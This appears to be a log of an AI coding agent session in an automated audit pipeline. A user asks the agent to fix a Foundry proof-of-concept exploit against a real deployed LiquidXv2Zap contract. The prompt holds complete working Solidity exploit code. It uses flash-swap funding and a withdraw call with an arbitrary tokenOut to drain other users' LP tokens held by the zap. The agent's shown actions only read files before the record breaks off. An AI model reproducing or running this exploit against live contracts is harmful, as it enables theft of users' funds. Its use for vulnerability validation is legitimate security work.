@@ -1,0 +1,3814 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e3605-9423-77e1-a42c-27f55affe2ca
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Arbitrary `tokenOut` lets withdrawers steal unrelated tokens held by the zap
+- claim: `withdraw()` only uses `tokenOut` to decide whether to consolidate into `token1`; otherwise it consolidates into `token0`, but it still transfers `IERC20(tokenOut)` at the end without validating that the contract actually holds the withdrawn proceeds in that asset. A caller can therefore request any ERC20 currently held by the zap instead of the asset produced by the withdrawal.
+- impact: Any user with a withdrawable LP position can drain unrelated balances from the contract. Because nonzero `basketId` deposits keep LP tokens in the zap and only update internal bookkeeping, an attacker can withdraw a small position while setting `tokenOut` to the pair LP token and steal other users' basket-backed LP. The real withdrawal proceeds remain stranded in the contract, leaving basket accounting undercollateralized.
+- exploit_paths: ["Basket users deposit with `basketId != 0`, so LP tokens stay in the zap balance and only `balanceOf[account][pair][basketId]` is incremented.", "An attacker obtains a small withdrawable position for the same pair.", "The attacker calls `withdraw(attacker, token0, token1, amount, pair, basketId, address(0), emptyPath, ...)`.", "`withdraw()` removes liquidity and recombines into `token0`/`token1`, but the final transfer sends `IERC20(pair)` from the contract's shared balance to the attacker."]
+
+Current FlawVerifier.sol:
+```solidity
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IRouterLike {
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IFactoryAllPairs {
+    function allPairsLength() external view returns (uint256);
+    function allPairs(uint256 index) external view returns (address);
+}
+
+interface IPair is IERC20 {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface ISwapPlusStructs {
+    struct SwapRouter {
+        string platform;
+        address tokenIn;
+        address tokenOut;
+        uint256 amountOutMin;
+        uint256 meta;
+        uint256 percent;
+    }
+
+    struct SwapLine {
+        SwapRouter[] swaps;
+    }
+
+    struct SwapBlock {
+        SwapLine[] lines;
+    }
+
+    struct SwapPath {
+        SwapBlock[] path;
+    }
+}
+
+interface ILiquidXv2Zap is ISwapPlusStructs {
+    function router() external view returns (address);
+    function factory() external view returns (address);
+
+    function deposit(
+        address account,
+        address token,
+        address tokenM,
+        SwapPath calldata path,
+        address token0,
+        address token1,
+        uint256[3] calldata amount,
+        uint256 basketId
+    ) external payable returns (uint256);
+
+    function withdraw(
+        address account,
+        address token0,
+        address token1,
+        uint256 amount,
+        address tokenOut,
+        uint256 basketId,
+        address tokenM,
+        SwapPath calldata wpath,
+        uint256[3] calldata amountMin
+    ) external returns (uint256);
+}
+
+contract FlawVerifier is ISwapPlusStructs {
+    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public exploitPair;
+    address public exploitToken0;
+    address public exploitToken1;
+    uint256 public seedCapitalUsed;
+    uint256 public stolenAmount;
+
+    struct PairState {
+        address pair;
+        address token0;
+        address token1;
+        uint256 reserve0;
+        uint256 reserve1;
+        uint256 supply;
+        uint256 zapLpBalance;
+    }
+
+    struct Plan {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+        uint256 previewStealLp;
+        uint256 previewRepayLp;
+        uint256 previewProfitLp;
+    }
+
+    struct AttemptContext {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+    }
+
+    AttemptContext private _attempt;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+        address factory = zap.factory();
+        uint256 pairCount = _allPairsLength(factory);
+        if (pairCount == 0) {
+            return;
+        }
+
+        Plan memory best;
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pair = _allPairs(factory, i);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            PairState memory state = _loadPairState(pair);
+            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
+                continue;
+            }
+
+            if (state.zapLpBalance == 0) {
+                continue;
+            }
+
+            Plan memory candidate = _buildPlan(state);
+            if (candidate.previewProfitLp > best.previewProfitLp) {
+                best = candidate;
+            }
+        }
+
+        if (best.previewProfitLp == 0) {
+            return;
+        }
+
+        try this.attemptFlash(best) returns (bool ok) {
+            if (ok) {
+                return;
+            }
+        } catch {}
+    }
+
+    function attemptFlash(Plan calldata plan) external returns (bool) {
+        require(msg.sender == address(this), "self only");
+
+        _attempt = AttemptContext({
+            pair: plan.pair,
+            token0: plan.token0,
+            token1: plan.token1,
+            capitalAmount: plan.capitalAmount,
+            burnLp: plan.burnLp
+        });
+
+        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
+        return _profitAmount > 0;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    receive() external payable {}
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
+        require(msg.sender == _attempt.pair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
+        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");
+
+        uint256 lpBefore = IERC20(_attempt.pair).balanceOf(address(this));
+
+        // exploit_paths[0]: basket users deposited with `basketId != 0`, so LP tokens
+        // remain parked in the zap's shared pair balance. This verifier only targets
+        // pairs where that pre-existing zap LP inventory is already present on-chain.
+
+        // exploit_paths[1]: the attacker obtains a small, real withdrawable position for
+        // the same pair. Flashswap funding only replaces upfront capital; it does not
+        // change the exploit causality or the assets used by the vulnerable withdraw.
+        uint256 mintedLp = _seedWithdrawablePosition(_attempt.capitalAmount);
+        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");
+
+        // exploit_paths[2]: call `withdraw()` on that legitimate LP position while
+        // setting `tokenOut` to the pair LP token itself.
+        _stealBasketBackedLp(_attempt.burnLp);
+
+        // exploit_paths[3]: `withdraw()` burns the legitimate LP position into token0 /
+        // token1, but its final unchecked transfer sends `IERC20(pair)` from the zap's
+        // shared balance to the attacker.
+        uint256 stolenLp = IERC20(_attempt.pair).balanceOf(address(this)) - lpBefore;
+        require(stolenLp > 0, "no stolen LP");
+
+        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
+        _repayFlashswapWithStolenLp(stolenLp, amountOwed);
+        _forceTransfer(_attempt.token0, _attempt.pair, amountOwed);
+
+        _profitToken = _attempt.pair;
+        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
+        require(_profitAmount > 0, "zero profit");
+
+        hypothesisValidated = true;
+        exploitPair = _attempt.pair;
+        exploitToken0 = _attempt.token0;
+        exploitToken1 = _attempt.token1;
+        seedCapitalUsed = _attempt.capitalAmount;
+        stolenAmount = stolenLp;
+    }
+
+    function _seedWithdrawablePosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
+        _forceApprove(_attempt.token0, TARGET, capitalAmount);
+
+        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        mintedLp = ILiquidXv2Zap(TARGET).deposit(
+            address(this),
+            _attempt.token0,
+            address(0),
+            emptyPath,
+            _attempt.token0,
+            _attempt.token1,
+            depositAmounts,
+            0
+        );
+    }
+
+    function _stealBasketBackedLp(uint256 burnLp) internal {
+        _forceApprove(_attempt.pair, TARGET, burnLp);
+
+        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        ILiquidXv2Zap(TARGET).withdraw(
+            address(this),
+            _attempt.token0,
+            _attempt.token1,
+            burnLp,
+            _attempt.pair,
+            0,
+            address(0),
+            emptyPath,
+            amountMins
+        );
+    }
+
+    function _repayFlashswapWithStolenLp(uint256 stolenLp, uint256 amountOwed) internal {
+        address router = ILiquidXv2Zap(TARGET).router();
+
+        (uint112 reserve0, uint112 reserve1, ) = IPair(_attempt.pair).getReserves();
+        uint256 supply = IPair(_attempt.pair).totalSupply();
+        uint256 repayLp = _minLpForToken0(
+            amountOwed,
+            uint256(reserve0),
+            uint256(reserve1),
+            supply,
+            stolenLp
+        );
+        require(repayLp < stolenLp, "not profitable");
+
+        _forceApprove(_attempt.pair, router, repayLp);
+        IRouterLike(router).removeLiquidity(
+            _attempt.token0,
+            _attempt.token1,
+            repayLp,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
+        if (token1Balance > 0) {
+            _forceApprove(_attempt.token1, router, token1Balance);
+            address[] memory path = new address[](2);
+            path[0] = _attempt.token1;
+            path[1] = _attempt.token0;
+            IRouterLike(router).swapExactTokensForTokens(
+                token1Balance,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
+        }
+
+        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "repayment shortfall");
+    }
+
+    function _buildPlan(PairState memory state) internal pure returns (Plan memory best) {
+        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return best;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp / 64;
+        sampleLp[1] = maxBurnLp / 32;
+        sampleLp[2] = maxBurnLp / 16;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 4;
+        sampleLp[5] = maxBurnLp / 2;
+        sampleLp[6] = maxBurnLp;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, sampleLp[i]);
+            if (candidate.previewProfitLp > best.previewProfitLp) {
+                best = candidate;
+            }
+        }
+    }
+
+    function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+        if (burnLp == 0) {
+            return plan;
+        }
+
+        uint256 previewStealLp = _consolidatedToToken0(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (previewStealLp == 0 || previewStealLp > state.zapLpBalance) {
+            return plan;
+        }
+
+        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (capitalAmount == 0 || capitalAmount >= state.reserve0) {
+            return plan;
+        }
+
+        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
+        uint256 previewRepayLp = _minLpForToken0(
+            amountOwed,
+            state.reserve0,
+            state.reserve1,
+            state.supply,
+            previewStealLp
+        );
+        if (previewRepayLp == 0 || previewRepayLp >= previewStealLp) {
+            return plan;
+        }
+
+        plan = Plan({
+            pair: state.pair,
+            token0: state.token0,
+            token1: state.token1,
+            capitalAmount: capitalAmount,
+            burnLp: burnLp,
+            previewStealLp: previewStealLp,
+            previewRepayLp: previewRepayLp,
+            previewProfitLp: previewStealLp - previewRepayLp
+        });
+    }
+
+    function _loadPairState(address pair) internal view returns (PairState memory state) {
+        state.pair = pair;
+        state.token0 = IPair(pair).token0();
+        state.token1 = IPair(pair).token1();
+        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
+        state.reserve0 = uint256(reserve0);
+        state.reserve1 = uint256(reserve1);
+        state.supply = IPair(pair).totalSupply();
+        state.zapLpBalance = IERC20(pair).balanceOf(TARGET);
+    }
+
+    function _emptyPath() internal pure returns (SwapPath memory path) {
+        path.path = new SwapBlock[](0);
+    }
+
+    function _allPairsLength(address factory) internal view returns (uint256 count) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector)
+        );
+        if (ok && data.length >= 32) {
+            count = abi.decode(data, (uint256));
+        }
+    }
+
+    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index)
+        );
+        if (ok && data.length >= 32) {
+            pair = abi.decode(data, (address));
+        }
+    }
+
+    function _maxLpForStealCap(
+        uint256 stealCapLp,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (supply <= 1) {
+            return 0;
+        }
+
+        uint256 low = 0;
+        uint256 high = supply - 1;
+        while (low < high) {
+            uint256 mid = (low + high + 1) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCapLp) {
+                low = mid;
+            } else {
+                high = mid - 1;
+            }
+        }
+        return low;
+    }
+
+    function _minLpForToken0(
+        uint256 token0Needed,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply,
+        uint256 upperBoundLp
+    ) internal pure returns (uint256) {
+        if (token0Needed == 0 || upperBoundLp == 0) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = upperBoundLp;
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _minToken0ForMintedLp(
+        uint256 lpTarget,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpTarget == 0 || reserve0 <= 1) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = reserve0 - 1;
+        if (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
+            return 0;
+        }
+
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+
+        return low;
+    }
+
+    function _previewOneSidedMintToken0(
+        uint256 amountIn,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (amountIn == 0 || reserve0 == 0 || reserve1 == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
+        if (swapAmount == 0 || swapAmount >= amountIn) {
+            return 0;
+        }
+
+        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
+        if (amount1Out == 0 || amount1Out >= reserve1) {
+            return 0;
+        }
+
+        uint256 remaining0 = amountIn - swapAmount;
+        uint256 postSwapReserve0 = reserve0 + swapAmount;
+        uint256 postSwapReserve1 = reserve1 - amount1Out;
+        if (postSwapReserve0 == 0 || postSwapReserve1 == 0) {
+            return 0;
+        }
+
+        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
+        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
+        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
+    }
+
+    function _consolidatedToToken0(
+        uint256 lpAmount,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpAmount == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 amount0 = (reserve0 * lpAmount) / supply;
+        uint256 amount1 = (reserve1 * lpAmount) / supply;
+        if (amount0 == 0 && amount1 == 0) {
+            return 0;
+        }
+
+        if (amount0 >= reserve0 || amount1 >= reserve1) {
+            return 0;
+        }
+
+        uint256 postReserve0 = reserve0 - amount0;
+        uint256 postReserve1 = reserve1 - amount1;
+        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
+        return amount0 + swapped;
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
+    }
+
+    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
+        if (reserve == 0 || inAmount == 0) {
+            return 0;
+        }
+        uint256 a1 = reserve * reserve * 1997 * 1997;
+        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
+        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
+    }
+
+    function _sqrt(uint256 x) internal pure returns (uint256 y) {
+        uint256 z = (x + 1) / 2;
+        y = x;
+        while (z < y) {
+            y = z;
+            z = (x / z + z) / 2;
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        uint256 current = IERC20(token).allowance(address(this), spender);
+        if (current >= amount) {
+            return;
+        }
+        if (current != 0) {
+            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        }
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
+    }
+
+    function _forceTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool success, bytes memory returnData) = token.call(data);
+        require(success, "token call failed");
+        if (returnData.length > 0) {
+            require(abi.decode(returnData, (bool)), "token op returned false");
+        }
+    }
+}
+```
+
+```
+
+forge stdout (tail):
+```
+Compiler run failed:
+Error (7858): Expected pragma, import directive or contract/interface/library/struct/enum/constant/function/error definition.
+ --> src/FlawVerifier.sol:1:1:
+  |
+1 | ```solidity
+  | ^
+
+
+```
+
+forge stderr (tail):
+```
+Error: Compilation failed
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the current `FlawVerifier.sol` in the workspace and the surrounding Foundry context so I can fix the compile failure without drifting from the exploit path.
+exec
+/bin/bash -lc pwd in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+
+exec
+/bin/bash -lc 'rg --files ..' in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IRouterLike {
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IFactoryAllPairs {
+    function allPairsLength() external view returns (uint256);
+    function allPairs(uint256 index) external view returns (address);
+}
+
+interface IPair is IERC20 {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface ISwapPlusStructs {
+    struct SwapRouter {
+        string platform;
+        address tokenIn;
+        address tokenOut;
+        uint256 amountOutMin;
+        uint256 meta;
+        uint256 percent;
+    }
+
+    struct SwapLine {
+        SwapRouter[] swaps;
+    }
+
+    struct SwapBlock {
+        SwapLine[] lines;
+    }
+
+    struct SwapPath {
+        SwapBlock[] path;
+    }
+}
+
+interface ILiquidXv2Zap is ISwapPlusStructs {
+    function router() external view returns (address);
+    function factory() external view returns (address);
+
+    function deposit(
+        address account,
+        address token,
+        address tokenM,
+        SwapPath calldata path,
+        address token0,
+        address token1,
+        uint256[3] calldata amount,
+        uint256 basketId
+    ) external payable returns (uint256);
+
+    function withdraw(
+        address account,
+        address token0,
+        address token1,
+        uint256 amount,
+        address tokenOut,
+        uint256 basketId,
+        address tokenM,
+        SwapPath calldata wpath,
+        uint256[3] calldata amountMin
+    ) external returns (uint256);
+}
+
+contract FlawVerifier is ISwapPlusStructs {
+    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public exploitPair;
+    address public exploitToken0;
+    address public exploitToken1;
+    uint256 public seedCapitalUsed;
+    uint256 public stolenAmount;
+
+    struct PairState {
+        address pair;
+        address token0;
+        address token1;
+        uint256 reserve0;
+        uint256 reserve1;
+        uint256 supply;
+        uint256 zapLpBalance;
+    }
+
+    struct Plan {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+        uint256 previewStealLp;
+        uint256 previewRepayLp;
+        uint256 previewProfitLp;
+    }
+
+    struct AttemptContext {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+    }
+
+    AttemptContext private _attempt;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+        address factory = zap.factory();
+        uint256 pairCount = _allPairsLength(factory);
+        if (pairCount == 0) {
+            return;
+        }
+
+        Plan memory best;
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pair = _allPairs(factory, i);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            PairState memory state = _loadPairState(pair);
+            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
+                continue;
+            }
+
+            if (state.zapLpBalance == 0) {
+                continue;
+            }
+
+            Plan memory candidate = _buildPlan(state);
+            if (candidate.previewProfitLp > best.previewProfitLp) {
+                best = candidate;
+            }
+        }
+
+        if (best.previewProfitLp == 0) {
+            return;
+        }
+
+        try this.attemptFlash(best) returns (bool ok) {
+            if (ok) {
+                return;
+            }
+        } catch {}
+    }
+
+    function attemptFlash(Plan calldata plan) external returns (bool) {
+        require(msg.sender == address(this), "self only");
+
+        _attempt = AttemptContext({
+            pair: plan.pair,
+            token0: plan.token0,
+            token1: plan.token1,
+            capitalAmount: plan.capitalAmount,
+            burnLp: plan.burnLp
+        });
+
+        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
+        return _profitAmount > 0;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    receive() external payable {}
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
+
+ succeeded in 145ms:
+../src/onchain_auto/_index.json
+../manifest.json
+../src/FlawVerifier.sol
+../src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/_etherscan_meta.json
+../src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol
+
+codex
+I’ve confirmed the file on disk no longer has the markdown fence issue, so the remaining risk is runtime mismatch against the real zap implementation. I’m reading the on-chain sourced `LiquidXv2Zap.sol` now to align the PoC with the actual `deposit` and `withdraw` behavior.
+exec
+/bin/bash -lc "rg -n \"function deposit|function withdraw|tokenOut|balanceOf\\[|basketId\" /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+128:  function deposit() external payable;
+130:  function withdraw(uint) external;
+343:    address tokenOut;
